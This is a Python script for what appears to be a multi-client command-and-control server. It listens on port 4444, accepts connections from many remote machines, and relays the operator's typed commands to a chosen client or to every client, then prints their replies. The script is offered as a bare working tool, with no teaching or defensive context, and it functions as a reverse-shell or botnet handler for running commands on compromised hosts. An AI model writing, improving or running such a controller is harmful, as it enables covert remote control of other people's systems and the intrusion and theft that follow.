import cmd
import socket
import os
from _thread import *
import re

ServerSocket = socket.socket()
host = '172.16.44.1'
port = 4444
ThreadCount = 0
cmd_queue={}
connections = []
try:
    ServerSocket.bind((host, port))
except socket.error as e:
    print(str(e))

print('Waitiing for a Connection..')
ServerSocket.listen(5)

def threaded_client(connection, num):
    global cmd_queue
    cmd_queue[num] = None
    while True:
        if cmd_queue[num]:
            connection.send(str.encode(cmd_queue[num]))
            if cmd_queue[num] == 'exit':
                break
            data = str(connection.recv(1024),"UTF-8")
            print()
            print(num,":",data)
            cmd_queue[num] = None
    connection.close()

def connectionManagement():
    global ThreadCount
    while True:
        Client, address = ServerSocket.accept()
        print('Connected to: ' + address[0] + ':' + str(address[1]))
        connections.append(address[0] + ':' + str(address[1]))
        start_new_thread(threaded_client, (Client, ThreadCount, ))
        ThreadCount += 1
        print('Thread Number: ' + str(ThreadCount))
        print("> ", end = "")

start_new_thread(connectionManagement, ())

while True:
    data = input("> ")
    if data == "list":
        for i in range(len(connections)):
            print(i, ":", connections[i])
    elif data == "exit":
        for i in range(ThreadCount):
            cmd_queue[i] = "exit"
        break
    elif data[:3] == "all":
        for i in range(ThreadCount):
            cmd_queue[i] = data[3:]
    else:
        try:
            nums = re.findall("\d*",data)
            num_size = len(nums[0])
            cmd_queue[int(nums[0])] = data[num_size:].strip()
        except:
            pass

ServerSocket.close()